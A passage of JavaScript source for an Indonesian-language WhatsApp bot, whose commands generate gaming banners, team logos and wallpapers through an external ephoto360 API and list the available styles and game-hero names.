│2 ▸ *butterfly*
│3 ▸ *coffee*
│4 ▸ *dove*
│5 ▸ *leaf*
│6 ▸ *like*
│7 ▸ *lotus*
│8 ▸ *milk-tea*
│9 ▸ *panda*
│10 ▸ *tree*
│11 ▸ *woman*
│12 ▸ *bear*
│13 ▸ *bull*
│14 ▸ *dragon*
│15 ▸ *eagle*
│16 ▸ *hawk*
│17 ▸ *ninja*
│18 ▸ *paw*
│19 ▸ *rooster*
│20 ▸ *sabertooth*
│21 ▸ *skull*
│22 ▸ *warrior*
│23 ▸ *zebra*
│
╰────────────˧`)
}
break

case'bannerofaov':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|character*\n*Untuk List Character Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|text2|character*\n*Untuk List Character Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&character=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listbannerofaov': {
if (!text) return m.reply(`"peura",
"rouie-5",
"roxie-2",
"sinestrea-4",
"tachi",
"telannas-7",
"tulen-7",
"veera-3",
"veera-4",
"veres-6",
"violet-7",
"wukong-3",
"annette-6",
"astrid-5",
"bright-2",
"butterfly-4",
"butterfly-5",
"diao-chan",
"enzo-4",
"helen",
"iggy-3",
"ilumia-4",
"ishar-5",
"lauriel-7",
"mina-4",
"annette-5",
"aoi-3",
"arum-3",
"azzenka",
"bright",
"capheny-6",
"celica-2",
"elsu-3",
"ilumia-3",
"ishar-4",
"kahlii-2",
"lauriel-6",
"laville-4",
"liliana-6",
"mina-3",
"paine",
"rouie-4",
"veres5",
"murad-6",
"veres-2",
"tulen-5",
"lindis-2",
"dextra",
"nakroth-6",
"sephera3",
"darcy2",
"capheny4",
"astrid4",
"yorn2",
"airi4",
"sinestrea2",
"sinestrea1",
"zephys2",
"yena4",
"volkath3",
"tulen4",
"thorne",
"quillen5",
"nakroth5",
"laville3",
"hayate4",
"florentino3",
"butterfly3",
"amily3",
"annette4",
"allain",
"arum2",
"astrid3",
"ata2",
"ata",
"butterfly2",
"capheny3",
"dirak",
"elandorr2",
"elandorr",
"florentino2",
"hayate3",
"ilumia2",
"ishar3",
"jinna2",
"keera",
"lauriel4",
"laville2",
"laville",
"liliana4",
"lubu2",
"mganga2",
"murad5",
"nakroth4",
"omen2",
"paine",
"preyta",
"qi2",
"quillen4",
"rouie2",
"rouie",
"skud2",
"taara",
"telannas4",
"valhein3",
"valhein2",
"violet5",
"violet4",
"yena3",
"yena2",
"zata",
"zata2",
"enzo",
"hayate2",
"krixi2",
"krizziz",
"murad4",
"volkath2",
"volkath",
"wukong2",
"arduin2",
"mina2",
"zuka2",
"wisp2",
"errol2",
"ishar2",
"lubu&diaochan",
"maloch",
"ormarr",
"thane",
"tulen&butterfly",
"ishar",
"tulen3",
"butterfly",
"lauriel3",
"liliana3",
"nakroth3",
"baldum",
"lauriel2",
"celica",
"annette3",
"capheny2",
"gildur2",
"quillen2",
"sephera2",
"ryoma2",
"tulen2",
"tulen1",
"qi",
"liliana2",
"murad3",
"zephys",
"zip2",
"airi3",
"amily2",
"astrid2",
"lauriel",
"nakroth2",
"violet3",
"airi2",
"alice3",
"arduin",
"elsu2",
"ignis",
"jinna",
"joker",
"kilgroth",
"lubu",
"marja",
"moren",
"payna",
"ryoma",
"skud",
"superman",
"valhein",
"xeniel",
"zill",
"yena",
"zip",
"sephera",
"aleister",
"alice2",
"annette2",
"arthur",
"arum",
"astrid",
"darcy",
"batman",
"errol",
"fennik",
"flash",
"florentino",
"gildur",
"grakk",
"hayate",
"kahlii",
"mganga",
"mina",
"murad2",
"omen",
"richter",
"rourke",
"telannas2",
"toro",
"violet2",
"wonderwomen",
"roxie",
"natalya",
"airi",
"amily",
"annette",
"elsu",
"ilumia",
"alice",
"zuka",
"wisp",
"wiro",
"veres",
"quillen",
"lindis",
"krixi",
"murad",
"liliana",
"enzo",
"diaochan",
"capheny",
"veera",
"tulen",
"slimz",
"yorn",
"violet",
"telannas",
"raz",
"wukong",
"nakroth"`) 
}
break

case'fbgamepubgcover':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|cover*\n*Untuk List Cover Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|cover*\n*Untuk List Cover Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&template=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listfbgamepubgcover': {
if (!text) return m.reply(`╭─▸ *LIST COVER*
│
├❖ *LIST*
│1 ▸ *cover-1*
│2 ▸ *cover-2*
│3 ▸ *cover-3*
│4 ▸ *cover-4*
│5 ▸ *cover-5*
│6 ▸ *cover-6*
│7 ▸ *cover-7*
│8 ▸ *cover-8*
│9 ▸ *cover-9*
│10 ▸ *cover-10*
│11 ▸ *cover-11*
│12 ▸ *cover-12*
│
╰────────────˧`)
}
break

case'anonymous': case'pubglogomaker': case'astronotspace': case'maketeamlogo':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|style*\n*Untuk List Style Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|style*\n*Untuk List Style Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&style=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listanonymous': {
if (!text) return m.reply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *style-1*
│2 ▸ *style-2*
│3 ▸ *style-3*
│
╰────────────˧`)
}
break
case'listpubglogomaker': {
if (!text) return m.reply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *women*
│2 ▸ *nen*
│
╰────────────˧`)
}
break
case'listastronotspace': {
if (!text) return m.reply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *anubis*
│2 ▸ *dragon*
│3 ▸ *duck*
│4 ▸ *gorilla*
│5 ▸ *panda*
│6 ▸ *panther*
│7 ▸ *shark*
│8 ▸ *squirrel*
│9 ▸ *tiger*
│10 ▸ *wolf*
│11 ▸ *bull*
│12 ▸ *rhino*
│13 ▸ *rooster*
│14 ▸ *pikachu*
│15 ▸ *parrot*
│16 ▸ *boar*
│17 ▸ *bee*
│18 ▸ *hurricane*
│19 ▸ *deer*
│20 ▸ *horse*
│21 ▸ *crocodile*
│22 ▸ *pitbull*
│
╰────────────˧`)
}
break
case'listmaketeamlogo': {
if (!text) return m.reply(`╭─▸ *LIST STYLE*
│
├❖ *LIST*
│1 ▸ *anubis*
│2 ▸ *cowgirl*
│3 ▸ *dragon*
│4 ▸ *duck*
│5 ▸ *ghost*
│6 ▸ *gorilla*
│7 ▸ *panda*
│8 ▸ *panther*
│9 ▸ *shark*
│10 ▸ *squirrel*
│11 ▸ *tiger*
│12 ▸ *wolf*
│13 ▸ *bee*
│14 ▸ *crocodile*
│15 ▸ *deer*
│16 ▸ *pitbull*
│17 ▸ *horse*
│18 ▸ *hurricane*
│19 ▸ *indian*
│20 ▸ *assassin*
│21 ▸ *boar*
│22 ▸ *rapid*
│23 ▸ *raven*
│24 ▸ *warrior*
│25 ▸ *pikachu*
│26 ▸ *pubg*
│27 ▸ *ninja*
│28 ▸ *drift*
│29 ▸ *yasuo*
│30 ▸ *rhino*
│31 ▸ *phoenix*
│32 ▸ *bull*
│33 ▸ *hornet*
│34 ▸ *eagle*
│35 ▸ *hunter*
│36 ▸ *parrot*
│37 ▸ *rooster*
│38 ▸ *lion*
│39 ▸ *skull*
│40 ▸ *wolver*
│41 ▸ *wolf*
│42 ▸ *cobra*
│43 ▸ *dragon*
│44 ▸ *panther*
│45 ▸ *owl*
│46 ▸ *tiger*
│47 ▸ *reaper*
│48 ▸ *warrior*
│
╰────────────˧`)
}
break

case'colorfulpubg':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|color*\n*Untuk List Color Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|color*\n*Untuk List Color Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&color=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listcolorfulpubg': {
if (!text) return m.reply(`╭─▸ *LIST COLOR*
│
├❖ *LIST*
│1 ▸ *gold*
│2 ▸ *green-blue*
│3 ▸ *green-yellow*
│4 ▸ *pink-yellow*
│5 ▸ *cyan-purple*
│6 ▸ *orange-red*
│
╰────────────˧`)
}
break

case'metalmascot': case'blueneon': case'circlemascotteam': case'cutegirlgamer':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|logo*\n*Untuk List Logo Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|logo*\n*Untuk List Logo Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&logo=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listmetalmascot': {
if (!text) return m.reply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *snakelion*
│2 ▸ *dragon*
│3 ▸ *eagle*
│4 ▸ *falcon*
│5 ▸ *fox*
│6 ▸ *lion*
│7 ▸ *panther*
│8 ▸ *phoenix*
│9 ▸ *rhino*
│10 ▸ *squirrel*
│11 ▸ *unicorn*
│12 ▸ *tiger*
│13 ▸ *zebra* 
│14 ▸ *wolf* 
│
╰────────────˧`)
}
break
case'listblueneon': {
if (!text) return m.reply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *tiger*
│2 ▸ *shark*
│3 ▸ *dugong*
│4 ▸ *bull*
│5 ▸ *cheetah*
│6 ▸ *lion*
│
╰────────────˧`)
}
break
case'listcirclemascotteam': {
if (!text) return m.reply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *panther*
│2 ▸ *rhino*
│3 ▸ *squirrel*
│4 ▸ *unicorn*
│5 ▸ *zebra*
│6 ▸ *lionsnake*
│7 ▸ *bear*
│8 ▸ *bull*
│9 ▸ *dragon*
│10 ▸ *eagle*
│11 ▸ *fox*
│12 ▸ *griffin*
│13 ▸ *hawk*
│14 ▸ *lion*
│15 ▸ *peacock*
│16 ▸ *phoenix*
│17 ▸ *tiger*
│18 ▸ *wolver*
│
╰────────────˧`)
}
break
case'listcutegirlgamer': {
if (!text) return m.reply(`╭─▸ *LIST LOGO*
│
├❖ *LIST*
│1 ▸ *style-1*
│2 ▸ *style-2*
│3 ▸ *style-3*
│4 ▸ *style-4*
│5 ▸ *style-5*
│6 ▸ *style-6*
│7 ▸ *style-7*
│8 ▸ *style-8*
│9 ▸ *style-9*
│10 ▸ *style-10*
│11 ▸ *style-11*
│12 ▸ *style-12*
│
╰────────────˧`)
}
break

case'effect3donbeach':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|background*\n*Untuk List Background Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|background*\n*Untuk List Background Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&background=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listeffect3donbeach': {
if (!text) return m.reply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *beach-1*
│2 ▸ *beach-2*
│3 ▸ *beach-3*
│4 ▸ *beach-4*
│5 ▸ *beach-5*
│6 ▸ *beach-6*
│
╰────────────˧`)
}
break

case'coverbannerlol': case'wallpaperaov': case'wallpaperml':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *text|hero*\n*Untuk List Hero Ketik .list${command}*`)
if (!q.includes('|')) return m.reply(`Gunakan dengan cara ${prefix+command} *text|hero*\n*Untuk List Hero Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m.reply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&heroes=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
m.reply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listcoverbannerlol': {
if (!text) return m.reply(`      "jinx7",
        "jinx-8",
        "kassadin-5",
        "nissfortune-5",
        "pyke-7",
        "riven-8",
        "sylas-5",
        "vayne-9",
        "kassadin-4",
        "qiyana-5",
        "renataglasc",
        "shen-5",
        "heimerdinger-3",
        "nunu-5",
        "orianna-4",
        "ziggs-4",
        "soraka-9",
        "soraka-10",
        "xayah-3",
        "zeri-2",
        "ahri-9",
        "akshan-2",
        "amumu-4",
        "annie-3",
        "bard-3",
        "brand-5",
        "diana-4",
        "draven-3",
        "ekko-6",
        "elise-4",
        "ezreal-7",
        "gwen-3",
        "janna-6",
        "kindred-3",
        "leblanc-7",
        "leona-7",
        "lissandra-4",
        "lux-8",
        "lux-9",
        "nalzahar-4",
        "nasteryi-7",
        "reksai-3",
        "sett-3",
        "sivir-6",
        "teemo-5",
        "tristana-6",
        "vladimir-5",
        "xinzhao-5",
        "zed-7",
        "zeri",
        "caitlyn-6",
        "caitlyn-7",
        "caitlyn-8",
        "caitlyn-9",
        "caitlyn-10",
        "caitlyn-11",
        "jayce-5",
        "kaisa-8",
        "karma-7",
        "thresh-6",
        "vi-5",
        "yasuo-8",
        "yasuo-9",
        "fiora-8",
        "norgana-7",
        "nami-5",
        "poppy-4",
        "syndra-5",
        "yuumi-4",
        "jarvaniv-6",
        "kayn-4",
        "kayle-5",
        "lillia-2",
        "norgana-6",
        "tryndamere-3",
        "vex",
        "vex-2",
        "yone-4",
        "tristana-5",
        "viego-2",
        "akali-10",
        "anivia-4",
        "darius-5",
        "graves-6",
        "seraphine-5",
        "shaco-2",
        "twistedfate-4",
        "xayah-2",
        "zyra-5",
        "ahri-8",
        "ashe-6",
        "cassiopeia-4",
        "evelynn-6",
        "leblanc-6",
        "nalphite-4",
        "warwick-5",
        "akshan",
        "graves-5",
        "nissfortune-5",
        "pyke-6",
        "rengar-6",
        "thresh-5",
        "diana-3",
        "relia-11",
        "olaf-3",
        "pantheon-6",
        "pantheon-7",
        "riven-7",
        "vayne-8",
        "corki-4",
        "naokai-2",
        "rammus-4",
        "veigar-4",
        "zed-6",
        "camille-4",
        "drmundo-3",
        "lucian-6",
        "nordekaiser-4",
        "renekton-4",
        "sejuani-5",
        "senna-3",
        "sylas-4",
        "varus-5",
        "xerath-3",
        "damwon",
        "galio-3",
        "gwen",
        "gwen-2",
        "jax-5",
        "jinx-6",
        "kayle-5",
        "sion-2",
        "twitch-4",
        "velkoz-4",
        "blitzcrank-3",
        "leona-6",
        "lulu-3",
        "lulu-4",
        "lux-7",
        "nasus-5",
        "nunu-4",
        "rumble-2",
        "samira-3",
        "aphelios-2",
        "blitzcrank-2",
        "caitlyn-5",
        "garen-6",
        "kogmaw-4",
        "leona-5",
        "alzahar-3",
        "syndra-4",
        "wukong-4",
        "yone-3",
        "yuumi-3",
        "zyra-4",
        "alistar-4",
        "chogath-2",
        "draven-2",
        "fiora-7",
        "jarvan-5",
        "jhin-5",
        "karma-6",
        "nautilus-2",
        "neeko-5",
        "shyvana-3",
        "viego",
        "azir-4",
        "diana-4",
        "gragas-2",
        "janna-5",
        "kalista-3",
        "katarina-6",
        "ornn-2",
        "qiyana-4",
        "quinn-3",
        "rell",
        "xinzhao-4",
        "anivia-3",
        "hecarim-4",
        "illaoi-2",
        "jayce-4",
        "lissandra-3",
        "nami-4",
        "nasus-4",
        "nidalee-5",
        "seraphine-4",
        "singed-2",
        "skarner-2",
        "soraka-7",
        "varus-4",
        "vladimir-4",
        "yorick-4",
        "zac",
        "riven-8",
        "ahri-7",
        "akali-9",
        "evelynn-5",
        "kaisa-7",
        "lucian-5",
        "seraphine",
        "seraphine-2",
        "seraphine-3",
        "aatrox-6",
        "amumu-3",
        "lise-3",
        "fizz-5",
        "karma-5",
        "zeri-2",
        "kassadin-3",
        "khazix-4",
        "sivir-5",
        "twistedfate-3",
        "ashe-5",
        "brand-4",
        "leesin-5",
        "olaf-2",
        "sett-2",
        "kayle-4",
        "leblanc-5",
        "pyke-5",
        "samira",
        "samira-2",
        "viktor-2",
        "yasuo-7",
        "zed-5",
        "ezreal-6",
        "nasteryi-6",
        "shen-4",
        "sona-4",
        "vi-4",
        "yone",
        "yone-2",
        "ziggs-3",
        "ahri-6",
        "cassiopeia-3",
        "kindred-2",
        "riven-6",
        "kennen-2",
        "kogmaw-3",
        "lillia",
        "syndra-3",
        "teemo-4",
        "thresh-4",
        "vayne-7",
        "velkoz-3",
        "yasuo-6",
        "zoe-4",
        "bard-2",
        "gnar-3",
        "irelia-10",
        "nocturne-4",
        "poppy-3",
        "enna-2",
        "volibear-3",
        "volibear-4",
        "ekko-5",
        "fiora-6",
        "lucian-4",
        "pantheon-5",
        "leblanc-4",
        "norgana-5",
        "urgot-4",
        "zyra-3",
        "jinx-5",
        "sett",
        "alistar-3",
        "katarina-5",
        "lux-5",
        "lux-6",
        "nasteryi-5",
        "nalphite-3",
        "nordekaiser-3",
        "reksai-2",
        "sejuani-4",
        "tryndamere-2",
        "xerath-2",
        "aphelios",
        "garen-5",
        "jax-4",
        "karma-4",
        "leesin-4",
        "leona-4",
        "nidalee-4",
        "rengar-5",
        "soraka-5",
        "soraka-6",
        "swain-4",
        "sylas-3",
        "trundle-2",
        "vladimir-3",
        "aatrox-5",
        "akali-8",
        "ekko-4",
        "qiyana-3",
        "senna",
        "yasuo-5",
        "ashe-4",
        "darius-4",
        "hecarim-3",
        "norgana-4",
        "nami-3",
        "riven-4",
        "riven-5",
        "ryze-3",
        "neeko-3",
        "eeko-4",
        "xayahrakan",
        "zoe-3",
        "airi-6",
        "noctune-3",
        "pantheon-3",
        "pantheon-4",
        "rammus-3",
        "udyr-2",
        "veigar-3",
        "akali-7",
        "garen-4",
        "irelia-8",
        "irelia-9",
        "jinx-4",
        "lucian-3",
        "pyke-4",
        "warwick-4",
        "caitlyn-3",
        "caitlyn-4",
        "kaisa-6",
        "qiyana",
        "qiyana-2",
        "yasuo-4",
        "jhin-3",
        "karma-3",
        "nordekaiser-2",
        "tristana-4",
        "nami",
        "poppy-3",
        "aatrox",
        "lulu",
        "braum",
        "camille",
        "karma",
        "kindred",
        "hecarim",
        "norgana",
        "renekton",
        "kennen",
        "akali",
        "varus",
        "orianna",
        "blitzcrank",
        "bloodmoonjhin",
        "bloodmoontalon",
        "arcaderiven",
        "udyr",
        "rumble",
        "gnar",
        "shaco",
        "twitch",
        "veigar",
        "tryndamere",
        "viktor",
        "trundle",
        "ezreal",
        "poppy",
        "lissandra",
        "jax",
        "vi",
        "vellkoz",
        "darius",
        "diana",
        "corki",
        "sivir",
        "ryze",
        "azir",
        "tristana",
        "kled",
        "volibear",
        "twisterfate",
        "anivia",
        "zyra",
        "quinn",
        "nissfortune",
        "kalista",
        "ezrealandshen",
        "gangplank",
        "hextachannie",
        "elementalistlux",
        "xinzhao",
        "vayne",
        "jhin",
        "reksai",
        "graves",
        "kogmaw",
        "garen",
        "porojinx",
        "warwick",
        "fizz",
        "caitlyn",
        "rengar",
        "talon",
        "nidalee",
        "lux",
        "jinx",
        "thresh",
        "wukong",
        "sona",
        "ahri",
        "riven",
        "zed",
        "leesin",
        "janna",
        "katarina",
        "leblanc",
        "leona",
        "fiora",
        "lucian",
        "shen",
        "ziggs",
        "yasuo",
        "ekko",
        "draven",
        "ashe",
        "ekko-5",
        "teemo",
        "khazix",
        "nasteryi",
        "brand",
        "taliyah",
        "nocturne",
        "cassiopeia",
        "xayah",
        "rakan",
        "syndra",
        "irelia",
        "leesingf",
        "yasuobm",
        "aurelionsol",
        "pantheon",
        "bard",
        "singed",
        "soraka",
        "taric",
        "naokai",
        "xerath",
        "gragas",
        "jayce",
        "riven3",
        "nalphite",
        "naster_yi2",
        "chogath",
        "zed2",
        "darius2",
        "talon2",
        "kayle",
        "drmundo",
        "rammus",
        "vladimir",
        "ahri-2",
        "karma-2",
        "jarvan",
        "nidalee-2",
        "vayner-2",
        "warwick-2",
        "rengar-2",
        "yasuo-3",
        "galio",
        "pantheon-2",
        "jinx-2",
        "nalzahar",
        "olaf",
        "shyvana",
        "thresh-2",
        "sion",
        "caitlyn-2",
        "swain",
        "kassadin",
        "heimerdinger",
        "amumu",
        "alistar",
        "nasus",
        "sejuani",
        "ezreal3",
        "nautilus",
        "fiddlesticks",
        "sona2",
        "karthus",
        "ekko2",
        "orianna2",
        "velkoz-2",
        "xinzhao2",
        "garen2",
        "annie-2",
        "yasuonb",
        "rivendb",
        "kayn",
        "kaisa",
        "veigar-2",
        "vayne-3",
        "twitch-2",
        "tristana-2",
        "rhaast",
        "nalzahar-2",
        "kayle-2",
        "illaoi",
        "fizz-2",
        "elise",
        "brand-2",
        "syndra-2",
        "soraka-2",
        "nissfortune-2",
        "hecarim-2",
        "ezreal-2",
        "ahri-3",
        "yorick",
        "z-2",
        "tahmkench",
        "shen-2",
        "ornn",
        "cassiopeia-2",
        "renekton-2",
        "nasus-2",
        "jarvan-2",
        "fiora-2",
        "alistar-2",
        "taric-2",
        "zac-2",
        "yorick-2",
        "varus-2",
        "nordekaiser",
        "nasteryi-3",
        "katarina-2",
        "janna-2",
        "fiora-3",
        "evelynn",
        "elise-2",
        "ashe-2",
        "annie",
        "zoe",
        "vi-2",
        "vayne-4",
        "rengar-3",
        "jhin-2",
        "graves-2",
        "xayahrakan",
        "warwick-3",
        "nissfortune-3",
        "lux-2",
        "jarvaniv",
        "zoe-2",
        "swain-2",
        "sivir-2",
        "nissfortune-4",
        "jax-2",
        "galio-2",
        "varus-3",
        "urgot",
        "twistedfate-2",
        "taric-3",
        "swain-3",
        "shen-3",
        "rammus-2",
        "pyke-2",
        "pyke",
        "nasus-3",
        "talon",
        "khazix-2",
        "kayn-2",
        "irelia-2",
        "evelynn-2",
        "akali-2",
        "vladimir-2",
        "jayce-2",
        "janna-3",
        "irelia-4",
        "irelia-3",
        "diana-2",
        "zed-3",
        "teemo-2",
        "taliyah-2",
        "shyvana-2",
        "poppy-2",
        "katarina-3",
        "jax-3",
        "garen-3",
        "darius-3",
        "chogath-2",
        "aatrox-2",
        "soraka-3",
        "sona-3",
        "sivir-3",
        "kaisa-2",
        "akali-4",
        "akali-3",
        "xinzhao-3",
        "urgot-3",
        "urgot-2",
        "tristana-3",
        "talon-3",
        "sejuani-2",
        "nunu-2",
        "lulu-2",
        "lucian-2",
        "irelia-6",
        "irelia-5",
        "ashe-3",
        "ziggs-2",
        "yasuo-2",
        "sona-4",
        "nalphite-2",
        "khazix-3",
        "kayn-3",
        "jinx-3",
        "orianna-3",
        "kaisa-4",
        "kaisa-3",
        "heimerdinger-2",
        "ezreal-4",
        "evelynn-3",
        "akali-5",
        "ahri-4",
        "thresh-3",
        "ryze-2",
        "kled-2",
        "janna-4",
        "graves-3",
        "fiddlesticks-2",
        "ekko-3",
        "amumu-2",
        "nami-2",
        "lulusoraka",
        "lissandra-2",
        "leona-3",
        "leona-2",
        "leblanc-2",
        "ezrealmissfortune",
        "camille-2",
        "twitch-3",
        "soraka-4",
        "renekton-3",
        "neeko-2",
        "neeko",
        "nasteryi-4",
        "drmundo-2",
        "akali-6",
        "zyra-2",
        "zilean",
        "wukong-3",
        "wukong-2",
        "teemo-3",
        "skarner",
        "sivir-4",
        "riven-2",
        "quinn-2",
        "pyke-3",
        "nocturne-2",
        "nidalee-3",
        "norgana-2",
        "leesin-3",
        "kogmaw-2",
        "kassadin-2",
        "karthus-2",
        "kalista-2",
        "gnar-2",
        "gangplank-2",
        "corki-2",
        "azir-3",
        "azir-2",
        "aatrox-4",
        "aatrox-3",
        "vi-3",
        "vayne-6",
        "vayne-5",
        "tahmkench-2",
        "sylas-2",
        "sylas",
        "sejuani-3",
        "fiora-4",
        "nunu-3",
        "norgana-3",
        "kayle-3",
        "brand-3",
        "anivia-2",
        "ahri-5",
        "yorick-3",
        "rengar-4",
        "fizz-4",
        "fizz-3",
        "corki-3",
        "zed-4",
        "rakan-2",
        "leblanc-3",
        "kaisa-5",
        "jarvaniv",
        "ivern",
        "irelia-7",
        "fiora-5",
        "evelynn-4",
        "camille-3",
        "yuumi-2",
        "yuumi",
        "lux-4",
        "lux-3",
        "katarina-4",
        "jayce-3",
        "graves-4",
        "ezreal-5"`) 
}
break
case'listwallpaperaov': {
if (!text) return m.reply(`╭─▸ *LIST HERO*
│
├❖ *LIST*
│1 ▸ *allain*
│2 ▸ *allain-2*
│3 ▸ *kahlii-3*
│4 ▸ *nakroth-4*
│5 ▸ *preyta-2*
│6 ▸ *skud-2*
│7 ▸ *taara-4*
│8 ▸ *valhein-4*
│9 ▸ *arum-4*
│10 ▸ *butterfly-6*
│11 ▸ *capheny-3*
│12 ▸ *elandorr-2*
│13 ▸ *ilumia-3*
│14 ▸ *ishar-4*
│15 ▸ *lauriel-6*
│16 ▸ *laville*
│17 ▸ *liliana-5*
│18 ▸ *nurad-8*
│19 ▸ *quillen-5*
│20 ▸ *rouie*
│21 ▸ *rouie-2*
│22 ▸ *taara-3*
│23 ▸ *telannas-5*
│24 ▸ *yena-4*
│25 ▸ *yena-5*
│26 ▸ *zata*
│27 ▸ *ata*
│28 ▸ *lauriel-5*
│29 ▸ *qi-3*
│30 ▸ *roxie-3*
│31 ▸ *wukong-5*
│32 ▸ *aleister-2*
│33 ▸ *amily-3*
│34 ▸ *arthur-3*
│35 ▸ *arum-3*
│36 ▸ *astrid-2*
│37 ▸ *dirak*
│38 ▸ *dirak-2*
│39 ▸ *grakk-5*
│40 ▸ *hayate-4*
│41 ▸ *ishar-2*
│42 ▸ *ishar-3*
│43 ▸ *jinna-2*
│44 ▸ *keera*
│45 ▸ *keera-3*
│46 ▸ *lauriel-4*
│47 ▸ *nax*
│48 ▸ *natalya-5*
│49 ▸ *quillen-4*
│50 ▸ *raz-3*
│51 ▸ *richter-2*
│52 ▸ *ryoma-4*
│53 ▸ *telannas-4*
│54 ▸ *ulen-6*
│55 ▸ *valhein-3*
│56 ▸ *violet-7*
